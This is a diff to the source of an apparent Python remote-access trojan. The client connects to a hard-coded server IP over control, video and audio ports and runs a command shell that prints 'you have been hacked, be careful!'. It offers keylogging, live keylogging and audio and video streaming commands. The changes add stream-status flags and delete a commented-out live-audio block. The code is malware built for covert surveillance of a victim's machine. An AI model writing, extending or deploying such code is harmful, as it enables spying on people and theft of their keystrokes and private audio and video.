@@ -18,6 +18,9 @@ SERVER_IP = '192.168.1.13' # Change this to your server's IP
 CONTROL_PORT = 5555
 VIDEO_PORT = 9999
 AUDIO_PORT = 9998
+
+video_stream_active = False
+audio_stream_active = False
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)     # Convert data to JSON format
@@ -305,7 +308,7 @@ def start_audio_stream():
 
 
 def shell():
-    global keylogger_status, keylogging_filename, liveaudio_status, audio_filename, livekeylogging_status
+    global keylogger_status, keylogging_filename, video_stream_active, audio_stream_active, livekeylogging_status
     print("you have been hacked, be careful!")
 
     while True:
@@ -343,18 +346,6 @@ def shell():
             else:
                 pass
 
-        # elif command[:15] == 'liveaudio_start':
-        #     if not liveaudio_status:
-        #         filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
-
-        #         if len(command) > 16:
-        #             audio_filename = filename if (filename != "") else 'liveaudio.wav'
-
-        #         liveaudio_status = True
-        #         liveaudio_start()
-        #     else:
-        #         pass
-
         elif command[:15] == 'keylogging_live':
             if not livekeylogging_status:
                 filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
@@ -391,7 +382,7 @@ def shell():
 
 # p, stream, audio_sock = None, None, None  # Initialize PyAudio and stream variables to None
 
-keylogger_status, liveaudio_status, livekeylogging_status = False, False, False
+keylogger_status,  livekeylogging_status =  False, False
 
 # audio_filename, keylogging_filename = None, None # Default filename for keylogging and live-audio
 
